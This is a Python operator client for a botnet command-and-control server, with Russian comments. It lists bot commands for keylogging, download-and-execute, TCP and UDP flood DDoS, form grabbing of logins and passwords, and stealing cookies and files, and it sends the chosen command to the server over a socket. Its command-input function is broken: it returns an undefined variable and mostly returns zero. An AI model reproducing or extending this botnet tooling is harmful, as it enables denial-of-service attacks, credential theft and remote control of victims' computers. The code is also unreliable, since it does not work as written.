#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket


HOST = "localhost"  # The remote host
PORT = 50007  # The same port as used by the server
IS_RECONNECT_ENABLED = False

COMMANDS_BOTS = {
    "COMMAND_JOIN": 0,					    # Регистрация бота на сервере
    "COMMAND_POLL": 1,					    # Запрос новых команд
    "COMMAND_CHECKIFSITEISUP": 2,		    # Проверка доступности сайта
    "COMMAND_SHUTDOWN": 3,				    # Выключение системы
    "COMMAND_RESTART": 4,				    # Перезагрузка системы
    "COMMAND_MESSAGEBOX": 5,			    # Вывод сообщения на экран
    "COMMAND_KEYLOG": 6,				    # Управление кейлоггером
    "COMMAND_REMOTEPROCESS": 7,			    # Получение информации о процессе
    "COMMAND_DOWNLOADEXECUTE": 8,		    # Скачивание и выполнение файла
    "COMMAND_REMOTEPROCESSNORESULT": 9,	    # Запуск процесса без вывода
    "COMMAND_TCPFLOOD": 10,				    # DDoS-атака (TCP-флуд)
    "COMMAND_UPDATE": 11,				    # Обновление бота
    "COMMAND_SCREENSHOT": 12,			    # Создание скриншота
    "COMMAND_UDPFLOOD": 13,				    # DDoS-атака (UDP-флуд)
    "COMMAND_FORMGRAB": 14,				    # Кража данных форм (логины/пароли)
    "COMMAND_STEALERS": 15,  			    # Кража данных (Cookies, файлов)
    "COMMAND_OFF_BOTS": -1
}
COMMANDS_ADMIN = {
    0: "COMMAND_CLEAR",					    # Очистить список активных комманд сервера
    1: "COMMAND_POLL",					    # Вывести список активных комманд сервера
    2: "COMMAND_CHECKIFSITEISUP",		    # Проверка доступности сайта
    3: "COMMAND_SHUTDOWN",				    # Выключение системы
    4: "COMMAND_RESTART",				    # Перезагрузка системы
    5: "COMMAND_MESSAGEBOX",			    # Вывод сообщения на экран
    6: "COMMAND_KEYLOG",				    # Управление кейлоггером
    7: "COMMAND_REMOTEPROCESS",			    # Получение информации о процессе
    8: "COMMAND_DOWNLOADEXECUTE",		    # Скачивание и выполнение файла
    9: "COMMAND_REMOTEPROCESSNORESULT",	    # Запуск процесса без вывода
    10: "COMMAND_TCPFLOOD",				    # DDoS-атака (TCP-флуд)
    11: "COMMAND_UPDATE",				    # Обновление бота
    12: "COMMAND_SCREENSHOT",			    # Создание скриншота
    13:	"COMMAND_UDPFLOOD",			        # DDoS-атака (UDP-флуд)
    14: "COMMAND_FORMGRAB",     		    # Кража данных форм (логины/пароли)
    15: "COMMAND_STEALERS"		    	    # Кража данных (Cookies, файлов)
}


def command():
    command = "None"
    while not ((command.isdigit() and int(command) in COMMANDS_ADMIN) or command == "exit"):
        command = input("Type the message to send: (help)\n")
        if command == "help":
            print("""   exit - отключиться от сервера
    0 - Очистить список активных комманд сервера
    1 - Вывести список активных комманд сервера
    2 - Проверка доступности сайта
    3 - Выключение системы
    4 - Перезагрузка системы
    5 - Вывод сообщения на экран
    6 - Управление кейлоггером
    7 - Получение информации о процессе
    8 - Скачивание и выполнение файла
    9 - Запуск процесса без вывода
    10 - DDoS-атака (TCP-флуд)
    11 - Обновление бота
    12 - Создание скриншота
    13	- DDoS-атака (UDP-флуд)
    14 - Кража данных форм (логины/пароли)
    15 - Кража данных (Cookies, файлов)""")
            match command:
                case "exit":
                    return "exit"
                case "1":
                    return 0
                case "2":
                    return 0
                case "3":
                    return 0
                case "4":
                    return 0
                case _:
                    return data


# // ID=123, Тип=10 (TCPFlood), Данные="1.1.1.1@80@60"	 -->	"123|10|1.1.1.1%4080%4060"
if __name__ == "__main__":
    is_started = False
    while IS_RECONNECT_ENABLED or not is_started:
        is_started = True
        print()
        print("Create admin client")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))
            print("Admin client connected")
            while True:
                # Input
                data = command()

                if data == "exit":
                    print("Close by client")
                    break
                # Send
                data_bytes = data.encode()
                sock.sendall(data_bytes)
                # Receive
                data_bytes = sock.recv(1024)
                data = data_bytes.decode()
                print("Received:", repr(data))
                if not data:
                    print("Closed by server")
                    break
            sock.close()
            print("Admin client disconnected")
